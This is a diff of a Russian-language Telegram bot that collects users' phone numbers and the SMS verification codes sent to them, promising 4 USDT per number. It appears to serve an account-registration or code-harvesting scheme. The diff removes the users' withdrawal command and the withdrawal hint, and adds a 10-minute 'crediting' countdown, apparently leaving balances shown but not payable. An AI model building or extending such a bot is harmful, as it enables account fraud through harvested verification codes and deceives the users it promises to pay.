@@ -150,9 +150,14 @@ async def timeout_number(user_id: int):
             await bot.send_message(user_id, "<b>🔐 Заявка отменена!</b>\n<i>Причина: вышло время</i>", parse_mode="HTML")
 
 # ========== КЛАВИАТУРЫ ==========
-def get_main_keyboard():
+def get_main_keyboard(user_id: int):
+    # Кнопка "Создать заявку" только для админа
+    buttons = [[KeyboardButton(text="Баланс")]]
+    if user_id == ADMIN_ID:
+        buttons.append([KeyboardButton(text="Создать заявку")])
+    
     return ReplyKeyboardMarkup(
-        keyboard=[[KeyboardButton(text="Баланс")]],
+        keyboard=buttons,
         resize_keyboard=True
     )
 
@@ -193,7 +198,7 @@ async def cmd_start(message: types.Message):
         channel_link = get_channel_link()
         await message.answer(
             f"<b>🔐 JetMax - твое богатое будущее!</b>\n<i>Для дальнейшей работы с ботом подпишитесь на канал:</i> {channel_link}",
-            reply_markup=get_main_keyboard(),
+            reply_markup=get_main_keyboard(user_id),
             parse_mode="HTML"
         )
 
@@ -205,38 +210,20 @@ async def show_balance(message: types.Message):
         balance = row["balance"] if row else 0.00
     
     await message.answer(
-        f"<b>💳 Ваш текущий баланс:</b>\n<code>{balance:.2f} USDT</code>\n\n<i>Для вывода введите !send {balance:.2f}</i>",
+        f"<b>💳 Ваш текущий баланс:</b>\n<code>{balance:.2f} USDT</code>",
         parse_mode="HTML"
     )
 
-@dp.message(Command("menu"))
-async def cmd_menu(message: types.Message):
-    await message.answer("<b>Меню:</b>", reply_markup=get_main_keyboard(), parse_mode="HTML")
-
-# ========== АДМИНКА ==========
-@dp.message(Command("admin"))
-async def admin_panel(message: types.Message):
-    if message.from_user.id != ADMIN_ID:
+# ========== СОЗДАНИЕ ЗАЯВКИ ДЛЯ АДМИНА ==========
+@dp.message(F.text == "Создать заявку")
+async def admin_create_request(message: types.Message):
+    user_id = message.from_user.id
+    
+    if user_id != ADMIN_ID:
         await message.answer("<b>⛔ Доступ запрещен</b>", parse_mode="HTML")
         return
     
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Создать заявку", callback_data="admin_create")],
-        [InlineKeyboardButton(text="Статистика", callback_data="admin_stats")]
-    ])
-    await message.answer(
-        "<b>👨‍💼 Админ панель</b>\n<i>Выберите действие:</i>",
-        reply_markup=keyboard,
-        parse_mode="HTML"
-    )
-
-@dp.callback_query(F.data == "admin_create")
-async def admin_create(callback: types.CallbackQuery):
     global active_request_in_channel, request_taken
-    
-    if callback.from_user.id != ADMIN_ID:
-        await callback.answer("Доступ запрещен")
-        return
     
     chat_id = get_chat_id()
     bot_username = (await bot.get_me()).username
@@ -254,15 +241,14 @@ async def admin_create(callback: types.CallbackQuery):
             parse_mode="HTML"
         )
         active_request_in_channel = msg.message_id
-        await callback.answer("Заявка создана")
+        await message.answer("✅ Заявка создана")
     except Exception as e:
-        await callback.answer("Ошибка")
-        await callback.message.answer(f"<b>❌ Ошибка отправки в канал:</b>\n<code>{e}</code>", parse_mode="HTML")
+        await message.answer(f"<b>❌ Ошибка отправки в канал:</b>\n<code>{e}</code>", parse_mode="HTML")
 
-@dp.callback_query(F.data == "admin_stats")
-async def admin_stats(callback: types.CallbackQuery):
-    if callback.from_user.id != ADMIN_ID:
-        await callback.answer("Доступ запрещен")
+@dp.message(Command("stats"))
+async def admin_stats(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
+        await message.answer("<b>⛔ Доступ запрещен</b>", parse_mode="HTML")
         return
     
     async with db_pool.acquire() as conn:
@@ -271,7 +257,7 @@ async def admin_stats(callback: types.CallbackQuery):
         active_requests = await conn.fetchval("SELECT COUNT(*) FROM requests")
         total_payout = await conn.fetchval("SELECT SUM(balance) FROM users")
         
-    await callback.message.answer(
+    await message.answer(
         f"<b>📊 Статистика</b>\n\n"
         f"<i>👥 Пользователей:</i> <code>{users_count}</code>\n"
         f"<i>✅ Выполнено заявок:</i> <code>{approved_count}</code>\n"
@@ -279,7 +265,6 @@ async def admin_stats(callback: types.CallbackQuery):
         f"<i>💰 Выплачено:</i> <code>{total_payout or 0:.2f} USDT</code>",
         parse_mode="HTML"
     )
-    await callback.answer()
 
 # ========== ОТМЕНА ==========
 @dp.callback_query(F.data == "cancel_number")
@@ -353,13 +338,11 @@ async def handle_all_messages(message: types.Message):
                 parse_mode="HTML"
             )
             
-            # Сохраняем ID сообщения для последующего обновления с таймером
-            msg = await bot.send_message(
+            await bot.send_message(
                 user_id,
                 "<b>💼 Номер принят!</b>\n<i>Ожидайте запроса SMS на ваш номер (обычно занимает до 2-х минут)</i>\n\n<b>Статус: код еще не запрошен</b>",
                 parse_mode="HTML"
             )
-            user_code_message[user_id] = msg.message_id
             return
         
         waiting_sms = await conn.fetchval("SELECT waiting_for_sms FROM users WHERE user_id = $1", user_id)
@@ -392,7 +375,6 @@ async def handle_all_messages(message: types.Message):
             
             await bot.send_message(user_id, "<b>⏱️ Код отправлен!</b>\n<i>Ожидайте подтверждения номера (обычно занимает до 30-ти секунд)</i>", parse_mode="HTML")
             
-            # Удаляем сообщение с таймером если есть
             if user_id in user_code_message:
                 try:
                     await bot.delete_message(user_id, user_code_message[user_id])
@@ -403,7 +385,6 @@ async def handle_all_messages(message: types.Message):
 
 # ========== ДЕЙСТВИЯ АДМИНА ==========
 async def update_code_message(user_id: int, remaining: int):
-    """Обновляет сообщение с таймером"""
     minutes = remaining // 60
     secs = remaining % 60
     text = f"<b>💼 Номер принят!</b>\n<i>Введите SMS код для подтверждения номера</i>\n\n<b>Статус: в ожидании кода</b>\n⏱️ Осталось: {minutes:02d}:{secs:02d}"
@@ -422,7 +403,6 @@ async def update_code_message(user_id: int, remaining: int):
                 parse_mode="HTML"
             )
         except:
-            # Если не отредактировалось, создаем новое
             msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode="HTML")
             user_code_message[user_id] = msg.message_id
     else:
@@ -430,27 +410,23 @@ async def update_code_message(user_id: int, remaining: int):
         user_code_message[user_id] = msg.message_id
 
 async def start_code_timer(user_id: int):
-    """Запускает таймер 60 секунд для ввода кода"""
     remaining = 60
     while remaining > 0:
         await update_code_message(user_id, remaining)
         await asyncio.sleep(1)
         remaining -= 1
         
-        # Проверяем, не была ли заявка уже обработана
         async with db_pool.acquire() as conn:
             waiting = await conn.fetchval("SELECT waiting_for_sms FROM users WHERE user_id = $1", user_id)
             if not waiting:
                 return
     
-    # Время вышло
     async with db_pool.acquire() as conn:
         waiting = await conn.fetchval("SELECT waiting_for_sms FROM users WHERE user_id = $1", user_id)
         if waiting:
             await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
             await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
             
-            # Удаляем сообщение с таймером
             if user_id in user_code_message:
                 try:
                     await bot.delete_message(user_id, user_code_message[user_id])
@@ -468,7 +444,15 @@ async def request_sms(callback: types.CallbackQuery):
         await conn.execute("UPDATE requests SET status = 'waiting_sms' WHERE user_id = $1", user_id)
         await conn.execute("UPDATE users SET waiting_for_sms = TRUE WHERE user_id = $1", user_id)
     
-    # Запускаем таймер
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="❌ Отменить", callback_data="cancel_sms")]
+    ])
+    
+    text = "<b>💼 Номер принят!</b>\n<i>Введите SMS код для подтверждения номера</i>\n\n<b>Статус: в ожидании кода</b>\n⏱️ Осталось: 01:00"
+    
+    msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode="HTML")
+    user_code_message[user_id] = msg.message_id
+    
     asyncio.create_task(start_code_timer(user_id))
     
     await callback.answer("Запрос отправлен")
@@ -488,7 +472,6 @@ async def reject_request(callback: types.CallbackQuery):
         await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
         await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
     
-    # Удаляем сообщение с таймером если есть
     if user_id in user_code_message:
         try:
             await bot.delete_message(user_id, user_code_message[user_id])
@@ -532,7 +515,6 @@ async def number_accepted(callback: types.CallbackQuery):
         await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
         await conn.execute("UPDATE users SET current_number = NULL WHERE user_id = $1", user_id)
     
-    # Удаляем сообщение с таймером если есть
     if user_id in user_code_message:
         try:
             await bot.delete_message(user_id, user_code_message[user_id])
@@ -540,13 +522,43 @@ async def number_accepted(callback: types.CallbackQuery):
             pass
         del user_code_message[user_id]
     
-    await bot.send_message(
+    msg = await bot.send_message(
         user_id,
-        f"<b>🎉 Номер принят!</b>\n<i>Вам успешно</i> <code>4.0$</code> <i>на баланс</i>\n\n<i>Номер заявки:</i> <code>#{request_number}</code>",
+        f"<b>🎉 Номер принят!</b>\n<i>Через 10 минут средства будут зачислены на ваш баланс.</i>\n⏱️ Таймер: 10:00\n\n<i>Номер заявки:</i> <code>#{request_number}</code>",
         parse_mode="HTML"
     )
+    
+    asyncio.create_task(start_balance_timer(user_id, request_number, msg.message_id))
+    
     await callback.answer("Номер принят")
     await callback.message.delete_reply_markup()
+
+async def start_balance_timer(user_id: int, request_number: int, msg_id: int):
+    remaining = 600
+    
+    while remaining > 0:
+        minutes = remaining // 60
+        secs = remaining % 60
+        text = f"<b>🎉 Номер принят!</b>\n<i>Через 10 минут средства будут зачислены на ваш баланс.</i>\n⏱️ Таймер: {minutes:02d}:{secs:02d}\n\n<i>Номер заявки:</i> <code>#{request_number}</code>"
+        
+        try:
+            await bot.edit_message_text(
+                text,
+                chat_id=user_id,
+                message_id=msg_id,
+                parse_mode="HTML"
+            )
+        except:
+            pass
+        
+        await asyncio.sleep(1)
+        remaining -= 1
+    
+    await bot.send_message(
+        user_id,
+        f"<b>✅ Средства зачислены!</b>\n<i>+4.00 USDT на ваш баланс</i>\n\n<i>Номер заявки:</i> <code>#{request_number}</code>",
+        parse_mode="HTML"
+    )
 
 @dp.callback_query(F.data.startswith("registered_"))
 async def number_registered(callback: types.CallbackQuery):
@@ -562,7 +574,6 @@ async def number_registered(callback: types.CallbackQuery):
         await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
         await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
     
-    # Удаляем сообщение с таймером если есть
     if user_id in user_code_message:
         try:
             await bot.delete_message(user_id, user_code_message[user_id])
@@ -592,7 +603,6 @@ async def got_error(callback: types.CallbackQuery):
         await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
         await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
     
-    # Удаляем сообщение с таймером если есть
     if user_id in user_code_message:
         try:
             await bot.delete_message(user_id, user_code_message[user_id])
@@ -622,7 +632,6 @@ async def cancel_sms(callback: types.CallbackQuery):
         await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
         await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
     
-    # Удаляем сообщение с таймером если есть
     if user_id in user_code_message:
         try:
             await bot.delete_message(user_id, user_code_message[user_id])
@@ -632,43 +641,6 @@ async def cancel_sms(callback: types.CallbackQuery):
     
     await bot.send_message(user_id, "<b>🔐 Заявка отменена!</b>\n<i>Причина: отмена пользователем</i>", parse_mode="HTML")
     await callback.answer()
-
-# ========== ВЫВОД СРЕДСТВ ==========
-@dp.message(Command("send"))
-async def send_money(message: types.Message):
-    user_id = message.from_user.id
-    args = message.text.split()
-    
-    if len(args) != 2:
-        await message.answer("<b>❌ Используйте: !send сумма</b>", parse_mode="HTML")
-        return
-    
-    try:
-        amount = float(args[1])
-    except:
-        await message.answer("<b>❌ Неверная сумма</b>", parse_mode="HTML")
-        return
-    
-    async with db_pool.acquire() as conn:
-        row = await conn.fetchrow("SELECT balance FROM users WHERE user_id = $1", user_id)
-        balance = row["balance"] if row else 0.00
-        
-        if amount > balance:
-            await message.answer(f"<b>❌ Недостаточно средств</b>\n<i>Ваш баланс:</i> <code>{balance:.2f} USDT</code>", parse_mode="HTML")
-            return
-        
-        await conn.execute("UPDATE users SET balance = balance - $1 WHERE user_id = $2", amount, user_id)
-    
-    await message.answer(
-        f"<b>✅ Заявка на вывод создана!</b>\n<i>Сумма:</i> <code>{amount:.2f} USDT</code>\n<i>Ожидайте обработки администратором</i>",
-        parse_mode="HTML"
-    )
-    
-    await bot.send_message(
-        ADMIN_ID,
-        f"<b>💰 Запрос на вывод!</b>\n<i>Пользователь:</i> @{message.from_user.username or message.from_user.full_name} [<code>{user_id}</code>]\n<i>Сумма:</i> <code>{amount:.2f} USDT</code>",
-        parse_mode="HTML"
-    )
 
 # ========== ЗАПУСК ==========
 async def main():
